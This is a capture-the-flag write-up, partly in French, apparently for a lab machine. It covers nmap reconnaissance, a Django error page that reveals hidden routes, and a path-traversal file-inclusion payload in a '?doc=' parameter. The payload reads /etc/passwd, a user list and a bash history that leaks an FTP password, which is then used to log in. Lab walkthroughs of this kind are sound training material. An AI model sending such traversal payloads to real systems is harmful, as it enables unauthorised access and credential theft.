# recon
```
nmap -Pn -sVC -T4 $ip           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-07 07:29 EST
Nmap scan report for 10.10.127.43 (10.10.127.43)
Host is up (0.088s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu L
| ssh-hostkey: 
|   2048 1a:8d:c6:0e:de:69:29:41:0d:50:e6:54:36:d0:13:1c (RSA)
|   256 89:ea:2c:42:6f:95:71:b8:ba:9a:3d:cb:f7:35:19:49 (ECDSA)
|_  256 fc:a2:bb:7e:92:2d:43:12:b1:66:ae:83:02:e9:6d:25 (ED25519)
80/tcp    open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
843/tcp   filtered unknown
20221/tcp open     ftp     vsftpd 3.0.3
```

```
nmap -Pn -T4 $ip -p- 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-07 07:39 EST
Warning: 10.10.127.43 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.127.43 (10.10.127.43)
Host is up (0.12s latency).
Not shown: 64012 closed tcp ports (conn-refused), 1519 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
1337/tcp  open  waste
20221/tcp open  unknown

```

## connect to http://10.10.127.43:1337/
Dans le chat on peut trouver le le chemin de userlist `/home/k1ller/userftp.txt`
http://10.10.127.43:1337/chat/home/k1ller/userftp.txt
```
404
Using the URLconf defined in DarkAtt4ck.urls, Django tried these URL patterns, in this order:
    secret_directory/
    operations_futures/
    operations_passees/
    chat/
The current path, chat/vdgb, didn’t match any of these.
```
On découvre un nouveau repertoire `secret_directory/`
# exploit
## LFI #Exploit_LFI 
http://10.10.127.43:1337/secret_directory/?doc=../../etc/passwd (ça passe)

http://10.10.127.43:1337/secret_directory/?doc=../../home/k1ller/userftp.txt
```
alpha01
shadowxx
k1ller
darkgod
```

## 
```
curl http://thm:1337/secret_directory/?doc=../../home/k1ller/.bash_history
```
	id
	ls -la
	whoami
	uname -a
	ftp k1ller@127.0.0.1:a02fb21da3e3f1c66a
	cat userftp.txt 
	exit

ftp pass = *a02fb21da3e3f1c66a*

## connect to ftp
```
ftp k1ller@thm -P 20221
```
